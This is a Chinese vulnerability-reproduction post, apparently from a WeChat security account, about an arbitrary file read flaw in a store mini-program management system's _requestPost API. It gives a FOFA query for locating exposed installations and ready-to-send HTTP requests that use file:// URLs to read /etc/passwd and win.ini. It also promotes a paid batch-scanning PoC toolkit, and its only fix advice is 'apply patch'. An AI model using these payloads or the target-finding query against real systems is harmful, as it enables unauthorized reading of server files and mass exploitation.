#  万能门店小程序管理系统_requestPost接口存在任意文件读取漏洞 附POC   
2024-11-28更新  南风漏洞复现文库   2024-11-28 15:29  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 万能门店小程序管理系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
万能门店小程序管理系统  
## 2.漏洞描述  
  
万能门店小程序管理系统_requestPost接口存在任意文件读取漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
万能门店小程序管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvUicoUH6w6qeut1ZNNzHjkG7RJVdr1Ccjd75Od5Ojic3ohXgVUlxJ9PFw/640?wx_fmt=png&from=appmsg "null")  
  
万能门店小程序管理系统_requestPost接口存在任意文件读取漏洞  
## 4.fofa查询语句  
  
body="/com/css/head_foot.css" || body="/com/css/iconfont"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/api/wxapps/_requestPost?data=1&url=file:///etc/passwd  
  
漏洞数据包： Linux  
```
GET /api/wxapps/_requestPost?data=1&url=file:///etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGv57LfNyNpBW30WzAE6U3UfQYLBHVe7uKvLTWz7zFeDpfc5xfD2wRGicg/640?wx_fmt=jpeg&from=appmsg "null")  
  
window  
```
GET /api/wxapps/_requestPost?data=1&url=file://C:\Windows\win.ini HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvvTz7cuxP6Dsf9KJLM4aOKZ571r6Xl8sjZBxsMshr3myaV16kSU3NKw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvCPHoLxRRYmE5xiaEye2sadHRsDfshKXsAabxG6P3rCk97zOyGT48gwg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvpJULiajk7ania0EVR8XLWafEtgy2JFkRkaoAicnRiakLJRK4FOgA8X2Hwg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvBfz6v4zaEKWgZbkta1QcV3W0lyBRDSR3tDsxBvuMT1Cf9DU3mH7j8g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bbspTMCDKxNmE8ofK1BMGvWr3fYrmBNU9gU4K35clJCF1uYwkTsm5H1bzSZr2UYtOP0ToIBevjfA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[顺景ERP GetFile接口存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487869&idx=1&sn=c6eec65d79d82285101ba7a80848077c&scene=21#wechat_redirect)  
  
  
[D-Link多款产品sc_mgr.cgi接口存在远程命令执行漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487857&idx=1&sn=6c19cce2a96593609bc7ac4d28ad17b5&scene=21#wechat_redirect)  
  
  
  
  
